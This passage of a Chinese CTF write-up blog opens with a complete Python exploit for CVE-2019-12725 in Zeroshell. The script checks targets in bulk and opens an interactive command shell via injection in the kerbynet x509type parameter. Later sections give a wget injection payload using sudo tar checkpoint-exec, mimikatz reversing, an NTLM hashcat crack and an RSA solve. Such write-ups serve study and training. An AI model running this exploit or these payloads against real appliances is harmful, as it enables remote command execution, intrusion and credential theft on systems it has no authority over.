class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">from</span> argparse <span class="keyword">import</span> ArgumentParser</span><br><span class="line"><span class="keyword">import</span> threadpool</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line">filename = sys.argv[<span class="number">1</span>]</span><br><span class="line">url_list=[]</span><br><span class="line"></span><br><span class="line"><span class="comment">#随机ua</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_ua</span>():</span><br><span class="line">first_num = random.randint(<span class="number">55</span>, <span class="number">62</span>)</span><br><span class="line">third_num = random.randint(<span class="number">0</span>, <span class="number">3200</span>)</span><br><span class="line">fourth_num = random.randint(<span class="number">0</span>, <span class="number">140</span>)</span><br><span class="line">os_type = [</span><br><span class="line"><span class="string">&#x27;(Windows NT 6.1; WOW64)&#x27;</span>, <span class="string">&#x27;(Windows NT 10.0; WOW64)&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;(Macintosh; Intel Mac OS X 10_12_6)&#x27;</span></span><br><span class="line">]</span><br><span class="line">chrome_version = <span class="string">&#x27;Chrome/&#123;&#125;.0.&#123;&#125;.&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(first_num, third_num, fourth_num)</span><br><span class="line"></span><br><span class="line">ua = <span class="string">&#x27; &#x27;</span>.join([<span class="string">&#x27;Mozilla/5.0&#x27;</span>, random.choice(os_type), <span class="string">&#x27;AppleWebKit/537.36&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;(KHTML, like Gecko)&#x27;</span>, chrome_version, <span class="string">&#x27;Safari/537.36&#x27;</span>]</span><br><span class="line">  )</span><br><span class="line"><span class="keyword">return</span> ua</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_vuln</span>(<span class="params">url</span>):</span><br><span class="line">url = parse.urlparse(url)</span><br><span class="line">url2=url.scheme + <span class="string">&#x27;://&#x27;</span> + url.netloc </span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: get_ua(),</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># data=base64.b64encode(&quot;eyJzZXQtcHJvcGVydHkiOnsicmVxdWVzdERpc3BhdGNoZXIucmVxdWVzdFBhcnNlcnMuZW5hYmxlUmVtb3RlU3RyZWFtaW5nIjp0cnVlfX0=&quot;)</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">res2 = requests.get(url2 + <span class="string">&#x27;/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0Aid%0A%27&#x27;</span>,headers=headers,timeout=<span class="number">10</span>,verify=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">if</span> res2.status_code==<span class="number">200</span> <span class="keyword">and</span> <span class="string">&quot;uid&quot;</span> <span class="keyword">in</span> res2.text:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\033[32m[+]%s is vuln\033[0m&quot;</span> %url2)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\033[31m[-]%s is not vuln\033[0m&quot;</span> %url1)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\033[31m[-]%s is timeout\033[0m&quot;</span> %url2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#cmdshell</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmdshell</span>(<span class="params">url</span>):</span><br><span class="line"><span class="keyword">if</span> check_vuln(url)==<span class="number">1</span>:</span><br><span class="line">url = parse.urlparse(url)</span><br><span class="line">url1 = url.scheme + <span class="string">&#x27;://&#x27;</span> + url.netloc + <span class="string">&#x27;/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0A&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">shell = <span class="built_in">input</span>(<span class="string">&quot;\033[35mcmd: \033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> shell ==<span class="string">&quot;exit&quot;</span>:</span><br><span class="line">sys.exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: get_ua(),</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">res = requests.get(url1 + shell + <span class="string">&#x27;%0A%27&#x27;</span>,headers=headers,timeout=<span class="number">10</span>,verify=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">if</span> res.status_code==<span class="number">200</span> <span class="keyword">and</span> <span class="built_in">len</span>(res.text) != <span class="number">0</span>:</span><br><span class="line">vulntext=res.text.split(<span class="string">&#x27;&lt;html&gt;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\033[32m%s\033[0m&quot;</span> %vulntext[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\033[31m[-]%s Command execution failed !\033[0m&quot;</span> %url1)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\033[31m[-]%s is timeout!\033[0m&quot;</span> %url1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#多线程</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multithreading</span>(<span class="params">url_list, pools=<span class="number">5</span></span>):</span><br><span class="line">works = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> url_list:</span><br><span class="line"><span class="comment"># works.append((func_params, None))</span></span><br><span class="line">works.append(i)</span><br><span class="line"><span class="comment"># print(works)</span></span><br><span class="line">pool = threadpool.ThreadPool(pools)</span><br><span class="line">reqs = threadpool.makeRequests(check_vuln, works)</span><br><span class="line">[pool.putRequest(req) <span class="keyword">for</span> req <span class="keyword">in</span> reqs]</span><br><span class="line">pool.wait()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">show = <span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"> _____ _   _ _____       _____  _____  __   _____        __   _____  ___________  _____ </span></span><br><span class="line"><span class="string">/  __ \ | | |  ___|     / __  \|  _  |/  | |  _  |      /  | / __  \|___  / __  \|  ___|</span></span><br><span class="line"><span class="string">| /  \/ | | | |__ ______`&#x27; / /&#x27;| |/&#x27; |`| | | |_| |______`| | `&#x27; / /&#x27;   / /`&#x27; / /&#x27;|___ \ </span></span><br><span class="line"><span class="string">| |   | | | |  __|______| / /  |  /| | | | \____ |______|| |   / /    / /   / /      \ \</span></span><br><span class="line"><span class="string">| \__/\ \_/ / |___      ./ /___\ |_/ /_| |_.___/ /      _| |_./ /___./ /  ./ /___/\__/ /</span></span><br><span class="line"><span class="string"> \____/\___/\____/      \_____/ \___/ \___/\____/       \___/\_____/\_/   \_____/\____/ </span></span><br><span class="line"><span class="string">                                                                                        </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                  </span></span><br><span class="line"><span class="string">                                                                                                      </span></span><br><span class="line"><span class="string">                                                   CVE-2019-12725 By m2</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(show + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">arg=ArgumentParser(description=<span class="string">&#x27;CVE-2019-12725 By m2&#x27;</span>)</span><br><span class="line">arg.add_argument(<span class="string">&quot;-u&quot;</span>,</span><br><span class="line"><span class="string">&quot;--url&quot;</span>,</span><br><span class="line"><span class="built_in">help</span>=<span class="string">&quot;Target URL; Example:http://ip:port&quot;</span>)</span><br><span class="line">arg.add_argument(<span class="string">&quot;-f&quot;</span>,</span><br><span class="line"><span class="string">&quot;--file&quot;</span>,</span><br><span class="line"><span class="built_in">help</span>=<span class="string">&quot;Target URL; Example:url.txt&quot;</span>)</span><br><span class="line">arg.add_argument(<span class="string">&quot;-c&quot;</span>,</span><br><span class="line"><span class="string">&quot;--cmd&quot;</span>,</span><br><span class="line"><span class="built_in">help</span>=<span class="string">&quot;Target URL; Example:http://ip:port&quot;</span>)</span><br><span class="line">args=arg.parse_args()</span><br><span class="line">url=args.url</span><br><span class="line">filename=args.file</span><br><span class="line">cmd=args.cmd</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[*]任务开始...&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> url != <span class="literal">None</span> <span class="keyword">and</span> cmd == <span class="literal">None</span> <span class="keyword">and</span> filename == <span class="literal">None</span>:</span><br><span class="line">check_vuln(url)</span><br><span class="line"><span class="keyword">elif</span> url == <span class="literal">None</span> <span class="keyword">and</span> cmd == <span class="literal">None</span> <span class="keyword">and</span> filename != <span class="literal">None</span>:</span><br><span class="line">start=time()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">open</span>(filename):</span><br><span class="line">i=i.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">check_vuln(i)</span><br><span class="line">end=time()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;任务完成，用时%d&#x27;</span> %(end-start))</span><br><span class="line"><span class="keyword">elif</span> url == <span class="literal">None</span> <span class="keyword">and</span> cmd != <span class="literal">None</span> <span class="keyword">and</span> filename == <span class="literal">None</span>:</span><br><span class="line">cmdshell(cmd)</span><br></pre></td></tr></table></figure><p>然后运行，</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085303408-1275301654.png" alt="image-20241216085252236"></p><p>然后去找flag，在<code>/Database/flag</code>下面。</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085308199-886976928.png" alt="image-20241216085257643"></p><p><code>flag&#123;c6045425-6e6e-41d0-be09-95682a4f65c4&#125;</code></p><h2 id="zeroshell-3"><a href="#zeroshell-3" class="headerlink" title="zeroshell_3"></a>zeroshell_3</h2><p>查看主机的外联服务器的所有TCP，UDP，IP和进程使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -antp</span><br></pre></td></tr></table></figure><p>（但是有点抽象，有时候看不到那个IP，）其他都是127.0.0.1只有他一个。</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085406663-304992750.png" alt="image-20241216085355787"></p><p><code>flag&#123;202.115.89.103&#125;</code></p><h2 id="zeroshell-4"><a href="#zeroshell-4" class="headerlink" title="zeroshell_4"></a>zeroshell_4</h2><p>直接找可执行文件像.sh或者.nginx这种使用命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name <span class="string">&quot;.sh&quot;</span></span><br><span class="line">find / -name <span class="string">&quot;.nginx&quot;</span></span><br></pre></td></tr></table></figure><p>.sh文件没有，发现.nginx很多，尝试一下。</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085759698-1634771253.png" alt="image-20241216085749134"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085915696-1839610967.png" alt="image-20241216085905063"></p><p><code>flag&#123;.nginx&#125;</code></p><h2 id="zeroshell-5"><a href="#zeroshell-5" class="headerlink" title="zeroshell_5"></a>zeroshell_5</h2><p>本身是一个RCE的洞，可以直接远程下载，用wget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget <span class="string">&quot;http://61.139.2.100/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=&#x27;%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpoint-action=exec=&#x27;cat%20/tmp/.nginx&#x27;%0A&#x27;&quot;</span></span><br></pre></td></tr></table></figure><p>然后直接把1.nginx dump下来，拉到ida，然后shift+f12直接找密钥了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085949719-1509725601.png" alt="image-20241216085938811"></p><p><code>flag&#123;11223344qweasdzxc&#125;</code></p><h2 id="zeroshell-6"><a href="#zeroshell-6" class="headerlink" title="zeroshell_6"></a>zeroshell_6</h2><p>题目说找到木马的启动项，直接ps -aux查看进程发现很多apache自带的进程，可疑的就几个，注意看这个进程</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090015789-1349072241.png" alt="image-20241216090004900"></p><p>一级一级网上找然后在system目录下面发现一个startup</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090031219-684402653.png" alt="image-20241216090020550"></p><p>往startup下面一个个找也不多，然后找到最终地方</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090039122-1056220359.png" alt="image-20241216090028452"></p><p><code>flag&#123;/var/register/system/startup/scripts/nat/File&#125;</code></p><h2 id="WinFT-1"><a href="#WinFT-1" class="headerlink" title="WinFT_1"></a>WinFT_1</h2><p>题目说找受控机木马的回连域名及ip及端口，</p><p>直接看机器里面的第一个文件exe</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090519510-272396622.png" alt="image-20241216090508053"></p><p>看见最后一个进程里面就有，得到flag</p><p><code>flag&#123;miscsecure.com:192.168.116.130:443&#125;</code></p><h2 id="WinFT-2"><a href="#WinFT-2" class="headerlink" title="WinFT_2"></a>WinFT_2</h2><p>说是启动项里面的flag一开始还是去msconfig里面找的，结果不知道，一想肯定不是exe，然后去计划任务看，</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090546842-57224494.png" alt="image-20241216090536136"></p><p>然后放Cyberchef里面解出来。</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090553292-1213496669.png" alt="image-20241216090542540"></p><p>解出flag</p><p><code>flag&#123;AES_encryption_algorithm_is_an_excellent_encryption_algorithm&#125;</code></p><h2 id="WinFT-5"><a href="#WinFT-5" class="headerlink" title="WinFT_5"></a>WinFT_5</h2><p>直接把流量放kali里面，binwalk分析</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090709285-1559417030.png" alt="image-20241216090658443"></p><p>发现位于22258409的偏移位置存在flag.txt</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090714616-1417817657.png" alt="image-20241216090703882"></p><p>使用dd命令分离，提取出来</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090720160-2147403155.png" alt="image-20241216090709460"></p><p>发现需要密码，</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090729621-221989880.png" alt="image-20241216090718742"></p><p>然后把zip放0101里面，发现有东西，</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090734963-1252085038.png" alt="image-20241216090724351"></p><p>放到Cyberchef里面解出密码：时间线关联非常重要</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090746208-2119841521.png" alt="image-20241216090735485"></p><p>解出flag</p><p><code>flag&#123;a1b2c3d4e5f67890abcdef1234567890-2f4d90a1b7c8e2349d3f56e0a9b01b8a-CBC&#125;</code></p><h2 id="sc05-1"><a href="#sc05-1" class="headerlink" title="sc05_1"></a>sc05_1</h2><p>这个题直接打开execl，转到tcp-export的位置，直接找到时间</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090813314-536377005.png" alt="image-20241216090802255"></p><p>2024/11/09_16:22:42这是时间，MD5编码一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090839866-1852212176.png" alt="image-20241216090829208"></p><p>得到<code>flag&#123;01DF5BC2388E287D4CC8F11EA4D31929&#125;</code></p><h2 id="Kiwi"><a href="#Kiwi" class="headerlink" title="Kiwi"></a>Kiwi</h2><p>exe直接拉ida之后，发现是个<code>mimikatz</code>程序，<code>lsadump::lsa /patch</code> 是这个程序的命令参数，作用是导出lsa，目的就是找这个东西，所以本题的逻辑就是去逆这个玩意儿</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091125302-903395086.png" alt="image-20241216091114310"></p><p>主要看下面的几个函数，先看函数sub_140082974，先是对input有一步异或，异或的逻辑是初始化了一个变量v6，而v6的值可以通过变量unk_140111152中有一个获取，然后循环v5的次数，得到v6的值，就是一个伪随机数，然后得到的数再在下面做一个变表的base64</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091133647-585107726.png" alt="image-20241216091122644"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091140755-348375415.png" alt="image-20241216091129821"></p><p>最后main里面的函数sub_140082774感觉就是一个将加密之后的结果上传的功能，然后给了流量包，那么去流量包里找密文即可</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091150949-544335224.png" alt="image-20241216091140032"></p><p>然后去看流量包，筛选一下http流量的upload流</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091158279-451596707.png" alt="image-20241216091147708"></p><p>然后发现三个包里的密文都是一样的</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091206352-768869769.png" alt="image-20241216091155375"></p><p>那么直接逆即可，懒得模拟随机数v6计算的过程，直接动调随机数种子就好了，然后直接解变表之后的数据即可</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091227952-1415334478.png" alt="image-20241216091216995"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> temp[<span class="number">178</span>]=&#123;<span class="number">0xb9</span>,<span class="number">0x48</span>,<span class="number">0x1c</span>,<span class="number">0x58</span>,<span class="number">0x81</span>,<span class="number">0x4f</span>,<span class="number">0x51</span>,<span class="number">0x7d</span>,<span class="number">0x27</span>,<span class="number">0x70</span>,<span class="number">0x33</span>,<span class="number">0x6f</span>,<span class="number">0x79</span>,<span class="number">0x48</span>,<span class="number">0x82</span>,<span class="number">0x21</span>,<span class="number">0x08</span>,<span class="number">0x80</span>,<span class="number">0x79</span>,<span class="number">0x49</span>,<span class="number">0x51</span>,<span class="number">0x52</span>,<span class="number">0x28</span>,<span class="number">0x9b</span>,<span class="number">0x7d</span>,<span class="number">0xbb</span>,<span class="number">0x40</span>,<span class="number">0x67</span>,<span class="number">0x45</span>,<span class="number">0x7a</span>,<span class="number">0x96</span>,<span class="number">0x38</span>,<span class="number">0x3e</span>,<span class="number">0x7d</span>,<span class="number">0x41</span>,<span class="number">0x42</span>,<span class="number">0x86</span>,<span class="number">0x60</span>,<span class="number">0x4f</span>,<span class="number">0x6c</span>,<span class="number">0x3b</span>,<span class="number">0x87</span>,<span class="number">0x2e</span>,<span class="number">0x26</span>,<span class="number">0x72</span>,<span class="number">0x51</span>,<span class="number">0x83</span>,<span class="number">0x80</span>,<span class="number">0x79</span>,<span class="number">0xbd</span>,<span class="number">0x79</span>,<span class="number">0x40</span>,<span class="number">0x67</span>,<span class="number">0x71</span>,<span class="number">0x4a</span>,<span class="number">0xa2</span>,<span class="number">0x98</span>,<span class="number">0x76</span>,<span class="number">0x3a</span>,<span class="number">0x8f</span>,<span class="number">0x68</span>,<span class="number">0xda</span>,<span class="number">0x7f</span>,<span class="number">0x74</span>,<span class="number">0x2a</span>,<span class="number">0x33</span>,<span class="number">0x55</span>,<span class="number">0x8d</span>,<span class="number">0x5e</span>,<span class="number">0x2b</span>,<span class="number">0x39</span>,<span class="number">0x6d</span>,<span class="number">0xbe</span>,<span class="number">0x5f</span>,<span class="number">0x74</span>,<span class="number">0x74</span>,<span class="number">0x7d</span>,<span class="number">0x11</span>,<span class="number">0x8e</span>,<span class="number">0x4b</span>,<span class="number">0x4d</span>,<span class="number">0x99</span>,<span class="number">0x64</span>,<span class="number">0x79</span>,<span class="number">0x63</span>,<span class="number">0xb3</span>,<span class="number">0x73</span>,<span class="number">0xca</span>,<span class="number">0x31</span>,<span class="number">0x90</span>,<span class="number">0xc3</span>,<span class="number">0x77</span>,<span class="number">0x1b</span>,<span class="number">0x6f</span>,<span class="number">0x61</span>,<span class="number">0x52</span>,<span class="number">0x11</span>,<span class="number">0xbc</span>,<span class="number">0xbd</span>,<span class="number">0x86</span>,<span class="number">0xb2</span>,<span class="number">0x78</span>,<span class="number">0x4f</span>,<span class="number">0x7e</span>,<span class="number">0x56</span>,<span class="number">0x8f</span>,<span class="number">0x6c</span>,<span class="number">0x94</span>,<span class="number">0xb4</span>,<span class="number">0x3a</span>,<span class="number">0x7f</span>,<span class="number">0x14</span>,<span class="number">0x4b</span>,<span class="number">0x79</span>,<span class="number">0xb6</span>,<span class="number">0x8c</span>,<span class="number">0xb0</span>,<span class="number">0xad</span>,<span class="number">0x8b</span>,<span class="number">0x67</span>,<span class="number">0x6d</span>,<span class="number">0xd1</span>,<span class="number">0x7a</span>,<span class="number">0x9a</span>,<span class="number">0xa7</span>,<span class="number">0x31</span>,<span class="number">0x74</span>,<span class="number">0x25</span>,<span class="number">0x3e</span>,<span class="number">0x61</span>,<span class="number">0x2e</span>,<span class="number">0x82</span>,<span class="number">0x3d</span>,<span class="number">0x63</span>,<span class="number">0x5e</span>,<span class="number">0x77</span>,<span class="number">0x6b</span>,<span class="number">0x7c</span>,<span class="number">0x3f</span>,<span class="number">0x24</span>,<span class="number">0x65</span>,<span class="number">0x35</span>,<span class="number">0x9f</span>,<span class="number">0x53</span>,<span class="number">0x84</span>,<span class="number">0x92</span>,<span class="number">0x42</span>,<span class="number">0xa0</span>,<span class="number">0x7d</span>,<span class="number">0x66</span>,<span class="number">0x70</span>,<span class="number">0x3b</span>,<span class="number">0xd3</span>,<span class="number">0x65</span>,<span class="number">0xa2</span>,<span class="number">0x6d</span>,<span class="number">0x7f</span>,<span class="number">0x19</span>,<span class="number">0x92</span>,<span class="number">0x7a</span>,<span class="number">0x8c</span>,<span class="number">0xb8</span>,<span class="number">0x6b</span>,<span class="number">0x12</span>,<span class="number">0x18</span>,<span class="number">0x66</span>,<span class="number">0x74</span>,<span class="number">0xc0</span>,<span class="number">0x48</span>,<span class="number">0x64</span>,<span class="number">0x9d</span>,<span class="number">0x0e</span>,<span class="number">0x6f</span>,<span class="number">0x53</span>,<span class="number">0x96</span>,<span class="number">0x49</span>,<span class="number">0x61</span>,<span class="number">0x5d</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> bbq;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="number">0x69</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">178</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            bbq=temp[i]-(<span class="built_in">rand</span>()%<span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,bbq^<span class="number">0x69</span>&amp;<span class="number">0xff</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091236273-1371002148.png" alt="image-20241216091225651"></p><p>然后直接把Lihua的NTLM去撞一下hash</p><p>直接上工具，得到密码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m <span class="number">1000</span> -a <span class="number">0</span> --force <span class="number">23</span>d1e086b85cc18587bbc8c33adefe07 /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091249996-1016038955.png" alt="image-20241216091239077"></p><p><code>flag&#123;memeallme!&#125;</code></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="rasnd"><a href="#rasnd" class="headerlink" title="rasnd"></a>rasnd</h2><p>基本上和DownUnderCTF apbq rsa i一致，密码系统的漏洞在于$x_1,x_2$的位数太小了，我们可以对hint1和hint2两边分别乘上$x_2,x_1$，然后两式相减构造出因子$q$，这样一来我们就可以和模数$n$求gcd得到我们的p，q了，完整的推导过程如下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091546611-1355733929.png" alt="image-20241216091535974"></p><p>第一段flag的脚本拿maple的改改就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">12041484248912643032281827138855623754144214035159379257661479163138740691775879744970066188895287834305299993544492956391792960896102848747030186725527727462894712060700333010084161232292945341786532686079371670477415860442278642697221340583569645588845014599550638325912186989334147835969874061056581067882184577796454285728001596032991576548616505694738258644347926711399658118922938510938119887205321934129700411659944514995029920532395752664247590123953777766329926456117538440392869407741390284440815213055049158646992117671363087867033230162348771385273345393144890080701361216495994574190386498448916311816797</span></span><br><span class="line">c1 = <span class="number">10606131316309955980934489999367845331927443863828583686141238316607269050684817039429298888781427841737522428868990033129396359422071583487650116153933235992772589074023014756603570826140692683719646462908402695451323182710065741160367461533107537946979392683247488668328727583897596393913788430745564403219132250771930726681544778750383056036694256341891369906160656846870749190113082284100872538571850988590168260190474932411452384081833324921809119609733433067883975638920071176430344363427978212930714208437515478915112319607619770956843101985777866969917968203033417800410149877887005212278008964025655987940957</span></span><br><span class="line">hint1 = <span class="number">1210163329385529229728939135743311954497267498380547164909234906003973611593798031761260290741249172090725684217414693693114449324670072882779106749063248097663867799443199777334875204112817022790357889479347171489446008099356250837065466918892616549927163255749494695158589358908509028746798132552909553239850862487264153570503905570515124883</span></span><br><span class="line">hint2 = <span class="number">5051204836955493115902299043864227023948832461277034652488258835184221521626345855566463934505556519381805282442109159775267806057755363491698274342564684351612127794982915561668169373789547317570427657539052251405041553056803632890416687608340386053780952769614333767097202054166611376586274576239144083005297435121927157297060690207800186682896326015350219721047026234504118337172881814255423542199000966155216738725842757720428244680380446841837035234700310983</span></span><br><span class="line">apbq1 = hint1 + <span class="number">0x114</span></span><br><span class="line">apbq2 = hint2 + <span class="number">0x514</span></span><br><span class="line"></span><br><span class="line">h1, h2 = apbq1, apbq2</span><br><span class="line"><span class="keyword">for</span> a1, a2 <span class="keyword">in</span> product(trange(<span class="number">2</span>**<span class="number">12</span>), repeat=<span class="number">2</span>):</span><br><span class="line">    q = gcd(a1*h1 - a2*h2, n1)</span><br><span class="line">    <span class="keyword">if</span> q != <span class="number">1</span> <span class="keyword">and</span> q&lt;n1:</span><br><span class="line">        <span class="built_in">print</span>(q,n1)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">q = <span class="number">114411205592246972220921230297242077940657645574270285474331214662896407392806621491630870605100409685745977685037681045756459767749822052290189670280723035164949944851395458359172624983161919320250363279972807380631771541310372109230847026234642522745139142418827828880645203931389076624693764995135409308641</span></span><br><span class="line">p = n1 // q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line">flag = long_to_bytes(<span class="built_in">pow</span>(c1, d, n1))</span><br><span class="line"><span 